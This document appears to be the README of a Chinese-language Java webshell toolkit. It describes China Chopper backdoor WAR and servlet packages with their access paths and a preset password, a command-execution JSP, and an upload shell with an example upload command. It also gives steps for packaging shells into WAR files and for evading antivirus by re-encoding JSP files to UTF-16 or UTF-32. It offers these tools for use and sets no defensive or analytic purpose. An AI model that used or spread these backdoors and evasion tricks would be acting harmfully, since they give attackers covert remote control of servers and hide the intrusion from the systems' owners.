
# java 相关webshell

## oneword.war

菜刀木马war包，部署后，访问/oneword/one.jsp，密码为：alpha

## Caidao.java

菜刀木马servlet版本源码

## oneserv.war

菜刀木马Caidao.java的war包，servlet版本，使用java8编译Caidao.java，部署后访问/oneserv/one，密码为：alpha

**servlet版本**可有效绕过某些客户端杀毒软件

> 该版本在一些容器里有兼容性问题

## cmd.jsp

linux命令执行

    c=command

windows命令执行加额外参数w=

    c=command&w=

## upfile_small.jsp

上传文件小马，使用方法(httpie命令，curl类似)

    http -f http://127.0.0.1:8000/test/a.jsp @oneserv.war f==aaa.war

---

# war打包

jsp webshell放入shellframe目录，切换到shellframe目录下执行命令

    jar cvf shell.war *.jsp WEB-INF

生成shell.war木马

---

# bypass方式

使用servlet版本的木马能够绕过一些安全软件

更改编码jsp文件编码方式可以绕过一些安全软件，例如 utf-16、utf-16be、utf-32

*使用pen.py file命令进行文件编码转换，例如：*

    pen.py file shell.jsp -c --dfile shell-utf16-bom.jsp --dtype utf-16le-bom

